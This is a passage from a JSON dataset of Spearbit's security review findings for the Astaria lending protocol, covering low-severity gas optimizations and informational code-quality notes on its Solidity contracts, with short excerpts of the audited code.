        "body": "fileBatch() does a requiresAuth check and then for each element in the input array calls file() which does another requiresAuth check. function fileBatch(File[] calldata files) external requiresAuth { for (uint256 i = 0; i < files.length; i++) { file(files[i]); } } ... function file(File calldata incoming) public requiresAuth { This wastes gas as if the fileBatch()'s requiresAuth pass, file()'s check will pass too.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "_sliceUint can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "_sliceUint can be optimized",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use basis points for ratios",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Fee ratios are represented through two state variables for numerator and denominator. Basis point system can be used in its place as it is simpler (denominator always set to 10_000), and gas efficient as denomi- nator is now a constant.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "No Need to Allocate Unused Variable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "LienToken._makePayment() returns two values: (Stack[] memory newStack, uint256 spent), but the second value is never read: (newStack, ) = _makePayment(_loadLienStorageSlot(), stack, amount); Also, if this value is planned to be used in future, it's not a useful value. It is equal to the payment made to the last lien. A more meaningful quantity can be the total payment made to the entire stack. Additional instances noted in Context above.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache Values to Save Gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Calls are occurring, same values are computed, or storage variables are being read, multiple times; e.g. CollateralToken.sol#L286-L307 reads the storage variable s.securityHooks[addr] four times. It's better to cache the result in a stack variable to save gas.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "RouterStorage.vaults can be a boolean mapping",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "RouterStorage.vaults is of type mapping(address => address). A key-value is stored in the mapping as: s.vaults[vaultAddr] = msg.sender; However, values in this mapping are only used to compare against address(0): if (_loadRouterSlot().vaults[msg.sender] == address(0)) { ... return _loadRouterSlot().vaults[vault] != address(0); It's better to have vaults as a boolean mapping as the assignment of msg.sender as value doesn't carry a special meaning.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "isValidReference() should just take an array element as input",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "stack[position]: isValidRefinance() takes stack array as an argument but only uses stack[0] and function isValidRefinance( ILienToken.Lien calldata newLien, uint8 position, ILienToken.Stack[] calldata stack ) public view returns (bool) { The usage of stack[0] can be replaced with stack[position] as stack[0].lien.collateralId == stack[position].lien.collateralId: if (newLien.collateralId != stack[0].lien.collateralId) { revert InvalidRefinanceCollateral(newLien.collateralId); } To save gas, it can directly take that one element as input.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Functions can be made external",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "If public function is not called from within the contract, it should made external for clarity, and can potentially save gas.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "a.mulDivDown(b,1) is equivalent to a*b",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Highlighted code above follow the pattern of a.mulDivDown(b, 1) which is equivalent to a*b.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use scratch space for keccak",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "computeId() function computes and returns uint256(keccak256(abi.encodePacked(token, to- kenId))). Since the data being hashed fits within 2 memory slots, scratch space can be used to avoid paying gas cost on memory expansion.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Define a named constant for the return value of onFlashAction",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "onFlashAction returns: keccak256(\"FlashAction.onFlashAction\")",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Define a named constant for permit typehash in ERC20-cloned",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In permit, the following type hash has been used: keccak256( \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\" )",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused struct, enum and storage fields can be removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The struct, enum and storage fields in this context have not been used in the project.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "WPStorage.expected's comment can be made more accurate",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In WPStorage's definition we have: uint88 expected; // Expected value of auctioned NFTs. yIntercept (virtual assets) of a PublicVault are ,! not modified on liquidation, only once an auction is completed. The comment for expected is not exactly accurate. The accumulated value in expected is the sum of all auctioned NFTs's amountOwed when (the timestamp) the liquidate function gets called. Whereas the NFTs get auctioned starting from their first stack's element's liquidationInitialAsk to 1_000 wei",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Leave comment that in WithdrawProxy.claim() the calculation of balance cannot underflow",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "There is this following line in claim() where balance is initialised: uint256 balance = ERC20(asset()).balanceOf(address(this)) - s.withdrawReserveReceived; With the current PublicVault implementation of IPublicVault, this cannot underflow since the increase in with- drawReserveReceived (using increaseWithdrawReserveReceived) is synced with increasing the asset balance by the same amount.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Shared logic in withdraw and redeem functions of WithdrawProxy can be turned into a shared modifier",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "withdraw and redeem both start with the following lines: WPStorage storage s = _loadSlot(); // If auction funds have been collected to the WithdrawProxy // but the PublicVault hasn't claimed its share, too much money will be sent to LPs if (s.finalAuctionEnd != 0) { // if finalAuctionEnd is 0, no auctions were added revert InvalidState(InvalidStates.NOT_CLAIMED); } Since they have this shared logic at the beginning of their body, we can consolidate the logic into a modifier.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "StrategyDetails version can only be used in custom implementation of IStrategyValidator, requires documentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "StrategyDetails.version is never used in the current implementations of the validators.  If the intention is to avoid replays across different versions of Astaria, we should add a check for it in commit- ment validation functions.  A custom implementation of IStrategyValidator can make use of this value, but this needs documentation as to exactly what it refers to.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Define helper functions to tag different pieces of cloned data for ClearingHouse",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "_getArgAddress(0) and _getArgUint256(21) are used as the ROUTER() and COLLATERAL_ID() in the fallback implementation for ClearingHouse was Clone derived contract.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "A new modifier onlyVault() can be defined for WithdrawProxy to consolidate logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The following require statement has been used in multiple functions including increaseWith- drawReserveReceived, drain, setWithdrawRatio and handleNewLiquidation. require(msg.sender == VAULT(), \"only vault can call\");",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistant pragma versions and floating pragma versions can be avoided",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Most contracts in the project use pragma solidity 0.8.17, but there are other variants as well: 69 pragma solidity ^0.8.16; pragma solidity ^0.8.16; pragma solidity ^0.8.16; // src/Interfaces/IAstariaVaultBase.sol // src/Interfaces/IERC4626Base.sol // src/Interfaces/ITokenBase.sol pragma solidity ^0.8.15; // src/Interfaces/ICollateralToken.sol pragma solidity ^0.8.0; pragma solidity ^0.8.0; pragma solidity ^0.8.0; pragma solidity ^0.8.0; pragma solidity ^0.8.0; pragma solidity ^0.8.0; // src/Interfaces/IERC20.sol // src/Interfaces/IERC165.sol // src/Interfaces/IERC1155.sol // src/Interfaces/IERC1155Receiver.sol // src/Interfaces/IERC721Receiver.sol // src/utils/Math.sol pragma solidity >=0.8.0; pragma solidity >=0.8.0; // src/Interfaces/IERC721.sol // src/utils/MerkleProofLib.sol And they all have floating version pragmas.  In hardhat.config.ts, solidity: \"0.8.13\" is used.  In .prettierrc settings we have \"compiler\": \"0.8.17\"  In .solhint.json we have \"compiler-version\": [\"error\", \"0.8.0\"]  foundry.toml does not have a solc setting",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "IBeacon is missing a compiler version pragma",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "IBeacon is missing a compiler version pragma.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "zone and zoneHash are not required for fully open Seaport orders",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "As per Seaport's documentation,zone and zoneHash are not required for PUBLIC orders: The zone of the order is an optional secondary account attached to the order with two additional privi- leges:  The zone may cancel orders where it is named as the zone by calling cancel. (Note that offerers can also cancel their own orders, either individually or for all orders signed with their current counter at once by calling incrementCounter).  \"Restricted\" orders (as specified by the order type) must either be executed by the zone or the offerer, or must be approved as indicated by a call to an isValidOrder or isValidOrderIncludingEx- traData view function on the zone. 70 This order isn't \"Restricted\", and there is no way to cancel a Seaport order once created from this contract.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistent treatment of delegate setting",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Private vaults include delegate in the allow list when deployed through the Router. Public vaults do not. The VaultImplementation, when mutating a delegate, sets them on allow list.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "AstariaRouter does not adhere to EIP1967 spec",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The Router serves as an implementation Beacon for proxy contracts, however, does not adhere to the EIP1967 spec.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Receiver of bought out lien must be approved by msg.sender",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The buyoutLien function requires that either the receiver of the lien is msg.sender or is an address approved by msg.sender: if (msg.sender != params.encumber.receiver) { require( _loadERC721Slot().isApprovedForAll[msg.sender][params.encumber.receiver] ); } This check seems unnecessary and in some cases will block users from buying out liens as intended.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "A new modifer onlyLienToken() can be defined to refactor logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The following require statement has been used in multiple locations in PublicVault: require(msg.sender == address(LIEN_TOKEN())); Locations used:  beforePayment  afterPayment  handleBuyoutLien  updateAfterLiquidationPayment  updateVaultAfterLiquidation",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "A redundant if block can be removed from PublicVault._afterCommitToLien",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In PublicVault._afterCommitToLien, we have the following if block: if (s.last == 0) { s.last = block.timestamp.safeCastTo40(); } This if block is redundant, since regardless of the value of s.last, a few lines before _accrue(s) would update the s.last to the current timestamp.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Private vaults' deposit endpoints can be potentially simplifed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "A private vault's deposit function can be called directly or indirectly using the ROUTER() (either way by anyone) and we have the following require statement: require( s.allowList[msg.sender] || (msg.sender == address(ROUTER()) && s.allowList[receiver]) ); If the ROUTER() is the AstariaRouter implementation of IAstariaRouter, then it inherits from ERC4626RouterBase and ERC4626Router which allows anyone to call into deposit of this private vault using:  depositToVault  depositMax  ERC4626RouterBase.deposit Thus if anyone of the above functions is called through the ROUTER(), msg.sender == address(ROUTER() will be true. Also, note that when private vaults are created using the newVault the msg.sender/owner along the delegate are added to the allowList and allowlist is enabled. And since there is no bookkeeping here for the receiver, except only the require statement, that means  Only the owner or the delegate of this private vault can call directly into deposit or  Anyone else can set the address to parameter of one of those 3 endpoints above to owner or delegate to deposit assets (wETH in the current implementation) into the private vault. And all the assets can be withdrawn by the owner only.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "The require statement in decreaseEpochLienCount can be more strict",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "decreaseEpochLienCount has the following require statement that limits who can call into it: require( msg.sender == address(ROUTER()) || msg.sender == address(LIEN_TOKEN()) ); So only, the ROUTER() and LIEN_TOKEN() are allowed to call into. But AstariaRouter never calls into this function.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "amount is not used in _afterCommitToLien",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "amount is not used in _afterCommitToLien to update/decrement s.yIntercept, because even though assets have been transferred out of the vault, they would still need to be paid back and so the net ef- fect on s.yIntercept (that is used in the calculation of the total virtual assets) is 0.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use modifier",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Highlighted code have require checks on msg.sender which can be converted to modifiers. For instance: require(address(msg.sender) == s.guardian);",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Prefer SafeCastLib for typecasting",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Highlighted code above does typecasting of several constant values. In case, some value doesn't fit in the type, this typecasting will silently ignore the higher order bits although that's currently not the case, but it may pose a risk if these values are changed in future.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rename Multicall to Multidelegatecall",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Multicall.sol lets performs multiple delegatecalls. Hence, the name Multicall is not suitable. The contract and the file should be named Multidelegatecall.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "safeTransferFrom() without the data argument can be used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Highlighted code above sends empty data over an external call via ERC721.safeTransferFrom(from, to, tokenId, data): IERC721(underlyingAsset).safeTransferFrom( address(this), releaseTo, assetId, \"\" ); data can be removed since ERC721.safeTransferFrom(from, to, tokenId) sets empty data too.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Fix documentation that updateVaultAfterLiquidation can be called by LIEN_TOKEN, not ROUTER",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The function has the correct validation that it can only be called by LIEN_TOKEN(), but the comment says it can only be called by ROUTER(). require(msg.sender == address(LIEN_TOKEN())); // can only be called by router",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Declare event and constants at the beginning",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Events and constants are generally declared at the beginning of a smart contract. However, for the highlighted code above, that's not the case.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rename Vault to PrivateVault",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Vault contract is used to represent private vaults.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove comment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Comment at line WithdrawProxy.sol#L229 can be removed: if ( block.timestamp < s.finalAuctionEnd // || s.finalAuctionEnd == uint256(0) ) { The condition in comments is always false as the code already reverts in that case.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "WithdrawProxy and PrivateVault symbols are missing hyphens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The symbol for the WithdrawProxy token is missing a hyphen after the W, which will make the name AST-W0x... instead of AST-W-0x.... Similarly, the symbol for the Private Vault token (in Vault.sol) is missing a hyphen after the V.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Lien cannot be bought out after stack.point.end",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The _getRemainingInterest function reverts with Panic(0x11) when block.timestamp > stack.point.end.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistent strictness of inequalities in isValidRefinance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In isValidRefinance, we check that either: a) newRate < maxNewRate && newEnd >= oldEnd b) newEnd - oldEnd >= minDurationIncrease && newRate <= oldRate We should be consistent in whether we're enforcing the changes are strict inequalities or non-strict inequalities.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Clarify comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Few comments are not clear on what they are referring to: zone: address(this), // 0x20 ... conduitKey: s.CONDUIT_KEY, // 0x120",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused files",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "CallUtils.sol is not used anywhere in the codebase.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document privileges and entities holding these privileges",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "There are certain privileged functionalities in the codebase (recognized through requiresAuth mod- ifier). Currently, we have to refer to tests to identify the setup.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document and ensure that maximum number of liens should not be set greater than 256",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Maximum number of liens in a stack is currently set to 5. While paying for a lien, the index in the stack is casted to uint8. This makes the implicit limit on maximum number of liens to be 256.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "transferWithdrawReserve() can return early when the current epoch is 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "If s.currentEpoch == 0, s.currentEpoch - 1 will wrap around to type(uint256).max and we will most probably will drain assets into address(0) in the following block: unchecked { s.withdrawReserve -= WithdrawProxy(withdrawProxy) .drain( s.withdrawReserve, s.epochData[s.currentEpoch - 1].withdrawProxy ) .safeCastTo88(); } But this cannot happen since in the outer if block the condition s.withdrawReserve > 0 indirectly means that s.currentEpoch > 0. The indirect implication above regarding the 2 conditions stems from the fact that s.withdrawReserve has only been set in transferWithdrawReserve() function or processEpoch(). In transferWithdrawReserve() function 78 it assumes a positive value only when s.currentEpoch > uint64(0) and in processEpoch() at the end we are incrementing s.currentEpoch.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "2 of the inner if blocks of processEpoch() check for a condition that has already been checked by an outer if block",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The following 2 if block checks are redundant: if (address(currentWithdrawProxy) != address(0)) { currentWithdrawProxy.setWithdrawRatio(s.liquidationWithdrawRatio); } uint256 expected = 0; if (address(currentWithdrawProxy) != address(0)) { expected = currentWithdrawProxy.getExpected(); } Since the condition address(currentWithdrawProxy) != address(0) has already been checked by an outer if block.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "General formatting suggestions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": " PublicVault.sol#L283 : there are extra sourounding paranthesis",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Identical collateral check is performed twice in _createLien",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In _createLien, a check is performed that the collateralId of the new lien matches the collateralId of the first lien on the stack. if (params.stack.length > 0) { if (params.lien.collateralId != params.stack[0].lien.collateralId) { revert InvalidState(InvalidStates.COLLATERAL_MISMATCH); } } This identical check is performed twice (L383-387 and L389-393).",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "checkAllowlistAndDepositCap modifer can be defined to consolidate some of the mint and deposit logic for public vaults",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The following code snippet has been used for both mint and deposit endpoints of a public vault: VIData storage s = _loadVISlot(); if (s.allowListEnabled) { require(s.allowList[receiver]); } uint256 assets = totalAssets(); if (s.depositCap != 0 && assets >= s.depositCap) { revert InvalidState(InvalidStates.DEPOSIT_CAP_EXCEEDED); }",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document why bytes4(0xffffffff) is chosen when CollateralToken acting as a Seaport zone to signal invalid orders",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "bytes4(0xffffffff) to indicate a Seaport order using this zone is not a valid order.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "CollateralToken.onERC721Received's use of depositFor stack variable is redundant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "If we follow the logic of assigning values to depositFor in CollateralToken.onERC721Received, we notice that it will end up being from_. So its usage is redundant.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "onlyOwner modifier can be defined to simplify the codebase",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "releaseToAddress checks whether the msg.sender is an owner of a collateral. CollateralToken already has a modifier onlyOwner(...), so the initial check in releaseToAddress can be delegated to the modifier.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document liquidator's role for the protocol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When a lien's term end (stack.point.end <= block.timestamp), anyone can call the liquidate on AstariaRouter. There is no restriction on the msg.sender. The msg.sender will be set as the liquidator and if:  The Seaport auction ends (3 days currently, set by the protocol), they can call liquidatorNFTClaim to claim the NFT.  Or if the Seaport auction settles, the liquidator receives the liquidation fee.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Until ASTARIA_ROUTER gets filed for CollateralToken, CollateralToken can not receive ERC721s safely.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "ASTARIA_ROUTER is not set in the CollateralToken's constructor. So till an entity with an author- ity would file for it, CollateralToken is unable to safely receive an ERC721 token ( whenNotPaused and on- ERC721Received would revert).",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "_getMaxPotentialDebtForCollateral might have meant to be an internal function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "_getMaxPotentialDebtForCollateral is defined as a public function. underscore which as a convention usually is used for internal or private functions.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "return keyword can be removed from stopLiens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "_stopLiens does not return any values but in stopLiens the return statement is used along with the non-existent return value of _stopLiens.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "LienToken's constructor does not set ASTARIA_ROUTER which makes some of the endpoints unfunc- tional",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "LienToken's constructor does not set ASTARIA_ROUTER. That means till an authorized entity calls file to set this parameter, the following functions would be broken/revert:  buyoutLien  _buyoutLien  _payDebt  getBuyout  _getBuyout  _isPublicVault  setPayee, partially broken  _paymentAH  payDebtViaClearingHouse",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document the approval process for a user's CollateralToken before calling commitToLiens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In the _executeCommitment's return statement: IVaultImplementation(c.lienRequest.strategy.vault).commitToLien( c, address(this) ); address(this) is the AstariaRouter. The call here to commitToLien enters into _validateCommitment with AstariaRouter as the receiver and so for it to no revert, the holder would have needed to set the approval for the router previously/beforehand: CT.isApprovedForAll(holder, receiver) // needs to be true 83",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "isValidRefinance's return statement can be reformatted",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Currently, it is a bit hard to read the return statement of isValidRefinance.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Withdraw Reserves should always be transferred before Commit to Lien",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When a new lien is requested, the _beforeCommitToLien() function is called. If the epoch is over, this calls processEpoch(). Otherwise, it calls transferWithdrawReserve(). function _beforeCommitToLien( IAstariaRouter.Commitment calldata params, address receiver ) internal virtual override(VaultImplementation) { VaultData storage s = _loadStorageSlot(); if (timeToEpochEnd() == uint256(0)) { processEpoch(); } else if (s.withdrawReserve > uint256(0)) { transferWithdrawReserve(); } } However, the processEpoch() function will fail if the withdraw reserves haven't been transferred. In this case, it would require the user to manually call transferWithdrawReserve() to fix things, and then request their lien again. Instead, the protocol should transfer the reserves whenever it is needed, and only then call processEpoch().",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove owner() variable from withdraw proxies",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When a withdrawProxy is deployed, it is created with certain immutable arguments. Two of these values are owner() and vault(), and they will always be equal. They seem to be used interchangeably on the withdraw proxy itself, so should be consolidated into one variable.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unnecessary checks in _validateCommitment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
